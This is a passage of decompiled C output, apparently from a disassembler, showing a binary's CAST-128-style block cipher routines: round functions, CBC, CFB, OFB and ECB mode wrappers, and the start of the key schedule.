  if ( !*(_DWORD *)(a2 + 128) )
  {
    v4 = __ROL4__(v3 + *(_DWORD *)(a2 + 120), *(_BYTE *)(a2 + 124));
    v5 = (dword_5263E0[BYTE2(v4)]
        + (dword_525BE0[(unsigned __int8)v4] ^ dword_5257E0[BYTE1(v4)])
        - dword_525FE0[HIBYTE(v4)]) ^ v2;
    v6 = __ROL4__(*(_DWORD *)(a2 + 112) - v5, *(_BYTE *)(a2 + 116));
    v7 = ((dword_525FE0[HIBYTE(v6)] ^ (dword_525BE0[(unsigned __int8)v6] + dword_5257E0[BYTE1(v6)]))
        - dword_5263E0[BYTE2(v6)]) ^ v3;
    v8 = __ROL4__(v7 ^ *(_DWORD *)(a2 + 104), *(_BYTE *)(a2 + 108));
    v2 = dword_5263E0[BYTE2(v8)] ^ (dword_525FE0[HIBYTE(v8)]
                                  + dword_5257E0[BYTE1(v8)]
                                  - dword_525BE0[(unsigned __int8)v8]) ^ v5;
    v9 = __ROL4__(v2 + *(_DWORD *)(a2 + 96), *(_BYTE *)(a2 + 100));
    v3 = (dword_5263E0[BYTE2(v9)]
        + (dword_525BE0[(unsigned __int8)v9] ^ dword_5257E0[BYTE1(v9)])
        - dword_525FE0[HIBYTE(v9)]) ^ v7;
  }
  v10 = __ROL4__(*(_DWORD *)(a2 + 88) - v3, *(_BYTE *)(a2 + 92));
  v11 = ((dword_525FE0[HIBYTE(v10)] ^ (dword_525BE0[(unsigned __int8)v10] + dword_5257E0[BYTE1(v10)]))
       - dword_5263E0[BYTE2(v10)]) ^ v2;
  v12 = __ROL4__(v11 ^ *(_DWORD *)(a2 + 80), *(_BYTE *)(a2 + 84));
  v13 = dword_5263E0[BYTE2(v12)] ^ (dword_525FE0[HIBYTE(v12)]
                                  + dword_5257E0[BYTE1(v12)]
                                  - dword_525BE0[(unsigned __int8)v12]) ^ v3;
  v14 = __ROL4__(v13 + *(_DWORD *)(a2 + 72), *(_BYTE *)(a2 + 76));
  v15 = (dword_5263E0[BYTE2(v14)]
       + (dword_525BE0[(unsigned __int8)v14] ^ dword_5257E0[BYTE1(v14)])
       - dword_525FE0[HIBYTE(v14)]) ^ v11;
  v16 = __ROL4__(*(_DWORD *)(a2 + 64) - v15, *(_BYTE *)(a2 + 68));
  v17 = ((dword_525FE0[HIBYTE(v16)] ^ (dword_525BE0[(unsigned __int8)v16] + dword_5257E0[BYTE1(v16)]))
       - dword_5263E0[BYTE2(v16)]) ^ v13;
  v18 = __ROL4__(v17 ^ *(_DWORD *)(a2 + 56), *(_BYTE *)(a2 + 60));
  v19 = dword_5263E0[BYTE2(v18)] ^ (dword_525FE0[HIBYTE(v18)]
                                  + dword_5257E0[BYTE1(v18)]
                                  - dword_525BE0[(unsigned __int8)v18]) ^ v15;
  v20 = __ROL4__(v19 + *(_DWORD *)(a2 + 48), *(_BYTE *)(a2 + 52));
  v21 = (dword_5263E0[BYTE2(v20)]
       + (dword_525BE0[(unsigned __int8)v20] ^ dword_5257E0[BYTE1(v20)])
       - dword_525FE0[HIBYTE(v20)]) ^ v17;
  v22 = __ROL4__(*(_DWORD *)(a2 + 40) - v21, *(_BYTE *)(a2 + 44));
  v23 = ((dword_525FE0[HIBYTE(v22)] ^ (dword_525BE0[(unsigned __int8)v22] + dword_5257E0[BYTE1(v22)]))
       - dword_5263E0[BYTE2(v22)]) ^ v19;
  v24 = __ROL4__(v23 ^ *(_DWORD *)(a2 + 32), *(_BYTE *)(a2 + 36));
  v25 = dword_5263E0[BYTE2(v24)] ^ (dword_525FE0[HIBYTE(v24)]
                                  + dword_5257E0[BYTE1(v24)]
                                  - dword_525BE0[(unsigned __int8)v24]) ^ v21;
  v26 = __ROL4__(v25 + *(_DWORD *)(a2 + 24), *(_BYTE *)(a2 + 28));
  v27 = (dword_5263E0[BYTE2(v26)]
       + (dword_525BE0[(unsigned __int8)v26] ^ dword_5257E0[BYTE1(v26)])
       - dword_525FE0[HIBYTE(v26)]) ^ v23;
  v28 = __ROL4__(*(_DWORD *)(a2 + 16) - v27, *(_BYTE *)(a2 + 20));
  v29 = ((dword_525FE0[HIBYTE(v28)] ^ (dword_525BE0[(unsigned __int8)v28] + dword_5257E0[BYTE1(v28)]))
       - dword_5263E0[BYTE2(v28)]) ^ v25;
  v30 = __ROL4__(v29 ^ *(_DWORD *)(a2 + 8), *(_BYTE *)(a2 + 12));
  v31 = dword_5263E0[BYTE2(v30)] ^ (dword_525FE0[HIBYTE(v30)]
                                  + dword_5257E0[BYTE1(v30)]
                                  - dword_525BE0[(unsigned __int8)v30]) ^ v27;
  v32 = __ROL4__(v31 + *(_DWORD *)a2, *(_BYTE *)(a2 + 4));
  result = v29 ^ (dword_5263E0[BYTE2(v32)]
                + (dword_5257E0[BYTE1(v32)] ^ dword_525BE0[(unsigned __int8)v32])
                - dword_525FE0[HIBYTE(v32)]);
  a1[1] = v31;
  *a1 = result;
  return result;
}
// 5257E0: using guessed type int dword_5257E0[256];
// 525BE0: using guessed type int dword_525BE0[256];
// 525FE0: using guessed type int dword_525FE0[256];
// 5263E0: using guessed type int dword_5263E0[256];

//----- (004B0A10) --------------------------------------------------------
unsigned int __cdecl sub_4B0A10(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, int a4, int a5, int a6)
{
  _BYTE *v6; // esi
  unsigned __int8 *v7; // edi
  unsigned int v8; // edx
  unsigned int result; // eax
  unsigned int v10; // ebx
  int v11; // eax
  int v12; // ecx
  unsigned __int8 *v13; // edi
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // ebx
  int v21; // ecx
  int v22; // ebx
  int v23; // ecx
  int v24; // ebx
  _BYTE *v25; // esi
  bool v26; // zf
  int v27; // edi
  int v28; // ecx
  int v29; // ecx
  int v30; // ecx
  int v31; // ecx
  int v32; // ecx
  int v33; // ebx
  int v34; // ebx
  _BYTE *v35; // esi
  _BYTE *v36; // ebp
  _BYTE *v37; // edi
  unsigned __int8 *v38; // esi
  unsigned int v39; // ebx
  _BYTE *v40; // ebp
  unsigned int v41; // ecx
  int v42; // ebp
  int v43; // eax
  unsigned __int8 *v44; // esi
  int v45; // ecx
  int v46; // edx
  int v47; // ebx
  int v48; // ebp
  int v49; // eax
  int v50; // ebp
  int v51; // ecx
  int v52; // ebp
  int v53; // ebx
  int v54; // eax
  int v55; // ecx
  _BYTE *v56; // edi
  int v57; // eax
  int v58; // ecx
  unsigned __int8 *v59; // esi
  int v60; // edx
  int v61; // eax
  unsigned int v62; // ecx
  int v63; // ebx
  int v64; // eax
  int v65; // edi
  _BYTE *v66; // ebp
  _BYTE *v67; // ebp
  unsigned int v68; // [esp+10h] [ebp-10h]
  unsigned int v69; // [esp+10h] [ebp-10h]
  unsigned int v70; // [esp+14h] [ebp-Ch]
  int v71; // [esp+14h] [ebp-Ch]
  unsigned int v72; // [esp+18h] [ebp-8h] BYREF
  unsigned int v73; // [esp+1Ch] [ebp-4h]
  unsigned int v74; // [esp+2Ch] [ebp+Ch]
  int v75; // [esp+2Ch] [ebp+Ch]
  unsigned int v76; // [esp+2Ch] [ebp+Ch]
  unsigned int v77; // [esp+2Ch] [ebp+Ch]
  unsigned int v78; // [esp+38h] [ebp+18h]
  unsigned int v79; // [esp+38h] [ebp+18h]

  if ( a6 )
  {
    v6 = a2;
    v7 = a1;
    v8 = _byteswap_ulong(*(_DWORD *)a5);
    result = _byteswap_ulong(*(_DWORD *)(a5 + 4));
    v10 = a3 - 8;
    v78 = result;
    if ( (int)(a3 - 8) >= 0 )
    {
      v74 = a3 >> 3;
      v68 = v10 - 8 * v74;
      do
      {
        v11 = *v7;
        v12 = v7[1];
        v13 = v7 + 1;
        v14 = (v12 << 16) | (v11 << 24);
        v15 = *++v13;
        v16 = (v15 << 8) | v14;
        v17 = *++v13;
        v18 = v17 | v16;
        v19 = *++v13;
        v20 = *++v13;
        v21 = (v20 << 16) | (v19 << 24);
        v22 = *++v13;
        v23 = (v22 << 8) | v21;
        v24 = v13[1];
        v72 = v8 ^ v18;
        v7 = v13 + 2;
        v73 = v78 ^ (v24 | v23);
        sub_4B0070((int *)&v72, a4);
        v8 = v72;
        result = v73;
        v25 = v6 + 1;
        *(v25 - 1) = HIBYTE(v72);
        *v25 = BYTE2(v8);
        v25 += 2;
        *(v25 - 1) = BYTE1(v8);
        *v25++ = v8;
        *v25++ = HIBYTE(result);
        *v25++ = BYTE2(result);
        *v25++ = BYTE1(result);
        *v25 = result;
        v6 = v25 + 1;
        v26 = v74-- == 1;
        v78 = result;
      }
      while ( !v26 );
      v10 = v68;
    }
    if ( v10 != -8 )
    {
      v27 = (int)&v7[v10 + 8];
      v28 = 0;
      v75 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
          goto LABEL_12;
        case 0xFFFFFFFD:
          goto LABEL_11;
        case 0xFFFFFFFE:
          goto LABEL_10;
        case 0xFFFFFFFF:
          goto LABEL_9;
        case 0u:
          v29 = *(unsigned __int8 *)--v27;
          v75 = v29;
LABEL_9:
          v30 = *(unsigned __int8 *)--v27;
          v75 |= v30 << 8;
LABEL_10:
          v31 = *(unsigned __int8 *)--v27;
          v75 |= v31 << 16;
LABEL_11:
          v32 = *(unsigned __int8 *)--v27;
          v75 |= v32 << 24;
LABEL_12:
          v28 = *(unsigned __int8 *)--v27;
LABEL_13:
          v33 = *(unsigned __int8 *)--v27;
          v28 |= v33 << 8;
LABEL_14:
          v34 = *(unsigned __int8 *)--v27;
          v28 |= v34 << 16;
LABEL_15:
          v28 |= *(unsigned __int8 *)(v27 - 1) << 24;
          break;
        default:
          break;
      }
      v72 = v8 ^ v28;
      v73 = result ^ v75;
      sub_4B0070((int *)&v72, a4);
      v8 = v72;
      result = v73;
      *v6 = HIBYTE(v72);
      v35 = v6 + 1;
      *v35++ = BYTE2(v8);
      *v35++ = BYTE1(v8);
      *v35++ = v8;
      *v35++ = HIBYTE(result);
      *v35++ = BYTE2(result);
      *v35 = BYTE1(result);
      v35[1] = result;
    }
    *(_BYTE *)a5 = HIBYTE(v8);
    *(_BYTE *)(a5 + 1) = BYTE2(v8);
    *(_BYTE *)(a5 + 2) = BYTE1(v8);
    v36 = (_BYTE *)(a5 + 3);
    *(_BYTE *)(a5 + 3) = v8;
  }
  else
  {
    v37 = a2;
    v38 = a1;
    v39 = _byteswap_ulong(*(_DWORD *)a5);
    result = _byteswap_ulong(*(_DWORD *)(a5 + 4));
    v40 = (_BYTE *)a5;
    v41 = a3 - 8;
    v70 = v39;
    v79 = result;
    v69 = a3 - 8;
    if ( (int)(a3 - 8) >= 0 )
    {
      v76 = a3 >> 3;
      v69 = v41 - 8 * v76;
      do
      {
        v42 = *v38;
        v43 = v38[1];
        v44 = v38 + 1;
        v45 = *++v44;
        v46 = *++v44;
        v47 = *++v44;
        v48 = (v43 << 16) | (v42 << 24);
        v49 = *++v44;
        v50 = (v45 << 8) | v48;
        v51 = *++v44;
        v52 = v46 | v50;
        v53 = v44[1] | (v51 << 8) | (v49 << 16) | (v47 << 24);
        v38 = v44 + 2;
        v72 = v52;
        v73 = v53;
        sub_4B0540((int *)&v72, a4);
        v54 = v72 ^ v70;
        v55 = v73 ^ v79;
        *v37 = (v72 ^ v70) >> 24;
        v56 = v37 + 1;
        *v56++ = BYTE2(v54);
        *v56 = BYTE1(v54);
        v56[1] = v54;
        v56 += 2;
        *v56++ = HIBYTE(v55);
        *v56++ = BYTE2(v55);
        *v56++ = BYTE1(v55);
        *v56 = v55;
        v37 = v56 + 1;
        v26 = v76-- == 1;
        v70 = v52;
        v79 = v53;
      }
      while ( !v26 );
      v40 = (_BYTE *)a5;
      v39 = v70;
      result = v79;
      v41 = v69;
    }
    if ( v41 != -8 )
    {
      v57 = *v38;
      v58 = v38[1];
      v59 = v38 + 1;
      v60 = *++v59;
      v61 = v59[1] | (v60 << 8) | (v58 << 16) | (v57 << 24);
      v62 = _byteswap_ulong(*(_DWORD *)(v59 + 2));
      v71 = v61;
      v72 = v61;
      v77 = v62;
      v73 = v62;
      sub_4B0540((int *)&v72, a4);
      v63 = v72 ^ v39;
      v64 = v73 ^ v79;
      v65 = (int)&v37[v69 + 8];
      switch ( v69 )
      {
        case 0xFFFFFFF9:
          goto LABEL_31;
        case 0xFFFFFFFA:
          goto LABEL_30;
        case 0xFFFFFFFB:
          goto LABEL_29;
        case 0xFFFFFFFC:
          goto LABEL_28;
        case 0xFFFFFFFD:
          goto LABEL_27;
        case 0xFFFFFFFE:
          goto LABEL_26;
        case 0xFFFFFFFF:
          goto LABEL_25;
        case 0u:
          *(_BYTE *)--v65 = v64;
LABEL_25:
          *(_BYTE *)--v65 = BYTE1(v64);
LABEL_26:
          *(_BYTE *)--v65 = BYTE2(v64);
LABEL_27:
          *(_BYTE *)--v65 = HIBYTE(v64);
LABEL_28:
          *(_BYTE *)--v65 = v63;
LABEL_29:
          *(_BYTE *)--v65 = BYTE1(v63);
LABEL_30:
          *(_BYTE *)--v65 = BYTE2(v63);
LABEL_31:
          *(_BYTE *)(v65 - 1) = HIBYTE(v63);
          break;
        default:
          break;
      }
      v39 = v71;
      result = v77;
    }
    *v40 = HIBYTE(v39);
    v66 = v40 + 1;
    *v66++ = BYTE2(v39);
    *v66 = BYTE1(v39);
    v36 = v66 + 1;
    *v36 = v39;
  }
  v67 = v36 + 1;
  *v67++ = HIBYTE(result);
  *v67++ = BYTE2(result);
  *v67 = BYTE1(result);
  v67[1] = result;
  return result;
}

//----- (004B0F00) --------------------------------------------------------
int *__cdecl sub_4B0F00(char *a1, _BYTE *a2, int a3, int a4, int a5, int *a6, int a7)
{
  int *result; // eax
  int v8; // ebp
  int v9; // esi
  int v10; // edx
  unsigned int v11; // ecx
  int v12; // ecx
  char v13; // al
  int v14; // edx
  unsigned int v15; // ecx
  int v16; // ecx
  char v17; // al
  char v18; // cl
  unsigned int v19; // [esp+10h] [ebp-8h] BYREF
  int v20; // [esp+14h] [ebp-4h]

  result = a6;
  v8 = a3;
  v9 = *a6;
  if ( !a7 )
  {
    if ( a3 )
    {
      do
      {
        --v8;
        if ( !v9 )
        {
          v14 = *(unsigned __int8 *)(a5 + 5);
          v19 = _byteswap_ulong(*(_DWORD *)a5);
          v20 = (v14 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
          sub_4B0070((int *)&v19, a4);
          v15 = v19;
          *(_BYTE *)a5 = HIBYTE(v19);
          *(_BYTE *)(a5 + 1) = BYTE2(v15);
          *(_BYTE *)(a5 + 2) = BYTE1(v15);
          *(_BYTE *)(a5 + 3) = v15;
          v16 = v20;
          *(_BYTE *)(a5 + 4) = HIBYTE(v20);
          *(_BYTE *)(a5 + 5) = BYTE2(v16);
          *(_BYTE *)(a5 + 6) = BYTE1(v16);
          *(_BYTE *)(a5 + 7) = v16;
        }
        v17 = *a1++;
        v18 = *(_BYTE *)(v9 + a5);
        *(_BYTE *)(v9 + a5) = v17;
        *a2 = v18 ^ v17;
        v9 = ((_BYTE)v9 + 1) & 7;
        ++a2;
      }
      while ( v8 );
      result = a6;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v9;
    return result;
  }
  do
  {
    --v8;
    if ( !v9 )
    {
      v10 = *(unsigned __int8 *)(a5 + 5);
      v19 = _byteswap_ulong(*(_DWORD *)a5);
      v20 = (v10 << 16) | (*(unsigned __int8 *)(a5 + 4) << 24) | *(unsigned __int8 *)(a5 + 7) | (*(unsigned __int8 *)(a5 + 6) << 8);
      sub_4B0070((int *)&v19, a4);
      v11 = v19;
      *(_BYTE *)a5 = HIBYTE(v19);
      *(_BYTE *)(a5 + 1) = BYTE2(v11);
      *(_BYTE *)(a5 + 2) = BYTE1(v11);
      *(_BYTE *)(a5 + 3) = v11;
      v12 = v20;
      *(_BYTE *)(a5 + 4) = HIBYTE(v20);
      *(_BYTE *)(a5 + 5) = BYTE2(v12);
      *(_BYTE *)(a5 + 6) = BYTE1(v12);
      *(_BYTE *)(a5 + 7) = v12;
    }
    v13 = *(_BYTE *)(v9 + a5) ^ *a1++;
    *a2 = v13;
    *(_BYTE *)(v9 + a5) = v13;
    v9 = ((_BYTE)v9 + 1) & 7;
    ++a2;
  }
  while ( v8 );
  result = a6;
  *a6 = v9;
  return result;
}

//----- (004B1100) --------------------------------------------------------
_BYTE *__cdecl sub_4B1100(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // edx
  unsigned int v5; // ecx
  int v6; // ecx
  _BYTE *result; // eax
  unsigned int v8; // [esp+0h] [ebp-8h] BYREF
  int v9; // [esp+4h] [ebp-4h]

  v4 = *(unsigned __int8 *)(a1 + 5);
  v8 = _byteswap_ulong(*(_DWORD *)a1);
  v9 = (v4 << 16) | (*(unsigned __int8 *)(a1 + 4) << 24) | *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8);
  if ( a4 )
    sub_4B0070((int *)&v8, a3);
  else
    sub_4B0540((int *)&v8, a3);
  v5 = v8;
  *a2 = HIBYTE(v8);
  a2[1] = BYTE2(v5);
  a2[2] = BYTE1(v5);
  a2[3] = v5;
  v6 = v9;
  a2[4] = HIBYTE(v9);
  a2[5] = BYTE2(v6);
  result = a2 + 6;
  a2[6] = BYTE1(v6);
  a2[7] = v6;
  return result;
}

//----- (004B11D0) --------------------------------------------------------
_BYTE *__cdecl sub_4B11D0(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int8 *a5, int *a6)
{
  int v6; // esi
  int v7; // edx
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  int v11; // ebx
  unsigned int v13; // edx
  _BYTE *result; // eax
  _BYTE *v16; // eax
  int v17; // [esp+10h] [ebp-28h]
  int v18; // [esp+18h] [ebp-20h]
  int v19; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v20; // [esp+20h] [ebp-18h]
  int v21; // [esp+24h] [ebp-14h]
  _BYTE *v22; // [esp+28h] [ebp-10h]
  char v23; // [esp+2Ch] [ebp-Ch]
  char v24; // [esp+2Dh] [ebp-Bh]
  char v25; // [esp+2Eh] [ebp-Ah]
  char v26; // [esp+2Fh] [ebp-9h]
  char v27; // [esp+30h] [ebp-8h]
  char v28; // [esp+31h] [ebp-7h]
  char v29; // [esp+32h] [ebp-6h]
  char v30; // [esp+33h] [ebp-5h]

  v21 = a4;
  v6 = *a6;
  v7 = a5[1];
  v18 = a3;
  v8 = *a5;
  v22 = a5 + 1;
  v9 = a5[3] | (a5[2] << 8) | (v7 << 16) | (v8 << 24);
  v10 = (a5[5] << 16) | (a5[4] << 24);
  v11 = a5[7] | (a5[6] << 8);
  v23 = HIBYTE(v9);
  v24 = BYTE2(v9);
  v13 = v11 | v10;
  v25 = BYTE1(v9);
  v27 = HIBYTE(v13);
  v28 = BYTE2(v13);
  result = (_BYTE *)(v13 >> 8);
  v17 = 0;
  v19 = v9;
  v20 = v13;
  v26 = v9;
  v29 = BYTE1(v13);
  v30 = v13;
  if ( a3 )
  {
    do
    {
      --v18;
      if ( !v6 )
      {
        sub_4B0070(&v19, v21);
        v9 = v19;
        v23 = HIBYTE(v19);
        v24 = BYTE2(v19);
        v25 = BYTE1(v19);
        v13 = v20;
        v27 = HIBYTE(v20);
        v28 = BYTE2(v20);
        ++v17;
        v26 = v19;
        v29 = BYTE1(v20);
        v30 = v20;
      }
      *a2++ = *a1++ ^ *(&v23 + v6);
      v6 = ((_BYTE)v6 + 1) & 7;
    }
    while ( v18 );
    if ( v17 )
    {
      *a5 = HIBYTE(v9);
      v16 = v22;
      *v22 = BYTE2(v9);
      *++v16 = BYTE1(v9);
      v16[1] = v9;
      v16 += 2;
      *v16++ = HIBYTE(v13);
      *v16 = BYTE2(v13);
      result = v16 + 1;
      *result = BYTE1(v13);
      result[1] = v13;
    }
    else
    {
      result = a6;
    }
    *a6 = v6;
  }
  else
  {
    *a6 = v6;
  }
  return result;
}

//----- (004B13C0) --------------------------------------------------------
int __cdecl sub_4B13C0(int a1, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  unsigned int v5; // ecx
  int v6; // ebx
  int v7; // ebp
  int v8; // edi
  int v9; // edx
  int v10; // ecx
  int v11; // eax
  int v12; // esi
  unsigned int v13; // eax
  int v14; // ebp
  int v15; // ebx
  int v16; // ecx
  unsigned int v17; // edi
  int v18; // ecx
  int v19; // ecx
  int v20; // edx
  int v21; // edi
  unsigned int v22; // edx
  int v23; // ecx
  int v24; // esi
  int v25; // eax
  unsigned int v26; // eax
  int v27; // esi
  int v28; // edi
  int v29; // edx
  int v30; // ecx
  int v31; // eax
  unsigned int v32; // eax
  int v33; // edi
  int v34; // ebx
  int v35; // eax
  int v36; // esi
  int v37; // ecx
  int v38; // eax
  unsigned int v39; // eax
  int v40; // ebp
  unsigned int v41; // edx
  int v42; // ebx
  int v43; // ebp
  int v44; // edx
  int v45; // eax
  int v46; // eax
  unsigned int v47; // ebx
  int v48; // ecx
  int v49; // ebx
  int v50; // ebp
  int v51; // eax
  int v52; // edi
  int v53; // ebp
  unsigned int v54; // eax
  int v55; // ebx
  int v56; // ecx
  int v57; // esi
  int v58; // eax
  int v59; // ebp
  int v60; // ecx
  unsigned int v61; // eax
  int v62; // edx
  int v63; // ecx
  int v64; // edx
  int v65; // eax
  int v66; // ebp
  int v67; // edx
  unsigned int v68; // ebp
  int v69; // ecx
  int v70; // edx
  int v71; // ebp
  int v72; // esi
  int v73; // eax
  int v74; // eax
  unsigned int v75; // eax
  int v76; // ecx
  unsigned int v77; // ecx
  int v78; // ebx
  int v79; // edx
  unsigned int v80; // edx
  int v81; // edx
  int v82; // esi
  int v83; // ecx
  unsigned int v84; // ecx
  int v85; // edx
  int v86; // edi
  int v87; // ebx
  int v88; // eax
  unsigned int v89; // eax
  int v90; // esi
  int v91; // edi
  int v92; // ecx
  int v93; // edx
  int v94; // eax
  unsigned int v95; // eax
  int v96; // edi
  int v97; // ebp
  int v98; // eax
  int v99; // esi
  int v100; // edx
  int v101; // eax
  int v102; // ebx
  unsigned int v103; // ecx
  int v104; // ebx
  int v105; // ebp
  int v106; // ecx
  int v107; // edi
  int v108; // eax
  int v109; // eax
  unsigned int v110; // ebx
  int v111; // edx
  int v112; // ebx
  int v113; // eax
  int v114; // ebp
  unsigned int v115; // eax
  int v116; // esi
  int v117; // eax
  int v118; // edx
  unsigned int v119; // eax
  int v120; // edi
  int v121; // esi
  int v122; // edx
  int v123; // eax
  int v124; // ebp
  int v125; // ebx
  unsigned int v126; // esi
  int v127; // ebp
  int v128; // edx
  int v129; // eax
  int v130; // esi
  unsigned int v131; // eax
  int v132; // ecx
  unsigned int v133; // eax
  int v134; // ebx
  int v135; // eax
  int v136; // esi
  int v137; // edi
  unsigned int v138; // ebx
  int v139; // eax
  int result; // eax
  int v141; // [esp+10h] [ebp-13Ch]
  int v142; // [esp+10h] [ebp-13Ch]
  int v143; // [esp+10h] [ebp-13Ch]
  int v144; // [esp+10h] [ebp-13Ch]
  int v145; // [esp+10h] [ebp-13Ch]
  int v146; // [esp+10h] [ebp-13Ch]
  int v147; // [esp+10h] [ebp-13Ch]
  int v148; // [esp+14h] [ebp-138h]
  int v149; // [esp+14h] [ebp-138h]
  int v150; // [esp+14h] [ebp-138h]
  int v151; // [esp+14h] [ebp-138h]
  int v152; // [esp+14h] [ebp-138h]
  int v153; // [esp+18h] [ebp-134h]
  int v154; // [esp+18h] [ebp-134h]
  int v155; // [esp+18h] [ebp-134h]
  int v156; // [esp+18h] [ebp-134h]
  int v157; // [esp+18h] [ebp-134h]
  int v158; // [esp+1Ch] [ebp-130h]
  int v159; // [esp+1Ch] [ebp-130h]
  int v160; // [esp+1Ch] [ebp-130h]
  int v161; // [esp+1Ch] [ebp-130h]
  int v162; // [esp+20h] [ebp-12Ch]
  int v163; // [esp+20h] [ebp-12Ch]
  int v164; // [esp+20h] [ebp-12Ch]
  int v165; // [esp+20h] [ebp-12Ch]
  int v166; // [esp+24h] [ebp-128h]
  int v167; // [esp+24h] [ebp-128h]
  int v168; // [esp+24h] [ebp-128h]
  int v169; // [esp+24h] [ebp-128h]
  unsigned int v170; // [esp+28h] [ebp-124h]
  unsigned int v171; // [esp+28h] [ebp-124h]
  unsigned int v172; // [esp+28h] [ebp-124h]
  unsigned int v173; // [esp+28h] [ebp-124h]
  unsigned int v174; // [esp+2Ch] [ebp-120h]
  unsigned int v175; // [esp+2Ch] [ebp-120h]
  unsigned int v176; // [esp+2Ch] [ebp-120h]
  unsigned int v177; // [esp+2Ch] [ebp-120h]
  unsigned int v178; // [esp+30h] [ebp-11Ch]
  unsigned int v179; // [esp+30h] [ebp-11Ch]
  unsigned int v180; // [esp+30h] [ebp-11Ch]
  unsigned int v181; // [esp+30h] [ebp-11Ch]
  unsigned int v182; // [esp+34h] [ebp-118h]
  unsigned int v183; // [esp+34h] [ebp-118h]
  unsigned int v184; // [esp+34h] [ebp-118h]
  unsigned int v185; // [esp+34h] [ebp-118h]
  unsigned int v186; // [esp+38h] [ebp-114h]
  int v187; // [esp+3Ch] [ebp-110h]
  int v188; // [esp+40h] [ebp-10Ch]
  int v189; // [esp+44h] [ebp-108h]
  int v190; // [esp+48h] [ebp-104h]
  int v191; // [esp+4Ch] [ebp-100h]
  int v192; // [esp+50h] [ebp-FCh]
  int v193; // [esp+54h] [ebp-F8h]
  unsigned int v194; // [esp+58h] [ebp-F4h]
  int v195; // [esp+5Ch] [ebp-F0h]
  int v196; // [esp+60h] [ebp-ECh]
  int v197; // [esp+64h] [ebp-E8h]
  unsigned int v198; // [esp+68h] [ebp-E4h]
  int v199; // [esp+6Ch] [ebp-E0h]
  int v200; // [esp+70h] [ebp-DCh]
  int v201; // [esp+74h] [ebp-D8h]
  unsigned int v202; // [esp+78h] [ebp-D4h]
  unsigned int v203; // [esp+7Ch] [ebp-D0h]
  unsigned int v204; // [esp+80h] [ebp-CCh]
  unsigned int v205; // [esp+84h] [ebp-C8h]
  int v206; // [esp+88h] [ebp-C4h]
  unsigned int v207; // [esp+8Ch] [ebp-C0h]
  int v208; // [esp+98h] [ebp-B4h]
  unsigned int v209; // [esp+9Ch] [ebp-B0h]
  int v210; // [esp+A0h] [ebp-ACh]
  int v211; // [esp+A8h] [ebp-A4h]
  unsigned int v212; // [esp+ACh] [ebp-A0h]
  int v213; // [esp+B4h] [ebp-98h]
  int v214; // [esp+B8h] [ebp-94h]
  unsigned int v215; // [esp+BCh] [ebp-90h]
  int v216; // [esp+C4h] [ebp-88h]
  int v217; // [esp+C8h] [ebp-84h]
  int v218[16]; // [esp+CCh] [ebp-80h]
  int v219[16]; // [esp+10Ch] [ebp-40h]

  v3 = 0;
  v4 = a2;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v186 = 0;
  v187 = 0;
  v188 = 0;
  v189 = 0;
  v190 = 0;
  v191 = 0;
  v192 = 0;
  v193 = 0;
  v194 = 0;
  v195 = 0;
  v196 = 0;
  v197 = 0;
  v198 = 0;
  v199 = 0;
  v200 = 0;
  v201 = 0;
  if ( a2 > 16 )
    v4 = 16;
  v9 = 0;
  if ( v4 > 0 )
  {
    do
    {
      *(&v186 + v9) = *(unsigned __int8 *)(v9 + a3);
      ++v9;
    }
    while ( v9 < v4 );
    v8 = v201;
    v7 = v200;
    v6 = v199;
    v3 = v190;
    v5 = v186;
  }
  v10 = v187 | (v5 << 8);
  v11 = v192 | ((v191 | (v3 << 8)) << 8);
  *(_DWORD *)(a1 + 128) = v4 <= 10;
  v203 = v193 | (v11 << 8);
  v12 = v8 | ((v7 | ((v6 | (v198 << 8)) << 8)) << 8);
  v13 = (v189 | ((v188 | (v10 << 8)) << 8)) ^ dword_526FE0[v194] ^ dword_526FE0[v198] ^ dword_5267E0[v6] ^ dword_5273E0[v7] ^ dword_526BE0[v8];
  v14 = (unsigned __int8)v13;
  v15 = BYTE2(v13);
  v141 = dword_526FE0[BYTE2(v13)];
  v16 = dword_5273E0[(unsigned __int8)v13] ^ dword_5273E0[v196];
  v17 = v13 >> 8;
  v170 = v13;
  v13 >>= 24;
  v18 = v141 ^ dword_5267E0[v13] ^ dword_526BE0[(unsigned __int8)v17] ^ v16;
  v208 = v14;
  v207 = v13;
  v174 = (v197 | ((v196 | ((v195 | (v194 << 8)) << 8)) << 8)) ^ v18;
  v211 = (unsigned __int8)(v197 ^ v18);
  v209 = HIBYTE(v174);
  v162 = dword_526FE0[BYTE2(v174)];
  v158 = dword_526BE0[BYTE1(v174)];
  v19 = dword_5273E0[HIBYTE(v174)];
  v178 = v12 ^ v19 ^ v162 ^ v158 ^ dword_5267E0[v211] ^ dword_5267E0[v195];
  v206 = v19;
  v214 = (unsigned __int8)v178;
  v212 = HIBYTE(v178);
  v166 = dword_5267E0[BYTE1(v178)];
  v153 = dword_526BE0[BYTE2(v178)];
  v182 = v203 ^ v153 ^ v166 ^ dword_5273E0[HIBYTE(v178)] ^ dword_526FE0[(unsigned __int8)v178] ^ dword_526BE0[v197];
  v217 = (unsigned __int8)v182;
  v216 = BYTE1(v182);
  v215 = HIBYTE(v182);
  v148 = dword_5273E0[BYTE1(v174)];
  v20 = dword_5267E0[(unsigned __int8)v17] ^ dword_526FE0[v211] ^ dword_5267E0[HIBYTE(v178)];
  v21 = dword_5273E0[(unsigned __int8)v17];
  v218[0] = v153 ^ v148 ^ v20;
  v218[1] = v19 ^ v162 ^ v158 ^ v166 ^ dword_526BE0[(unsigned __int8)v178];
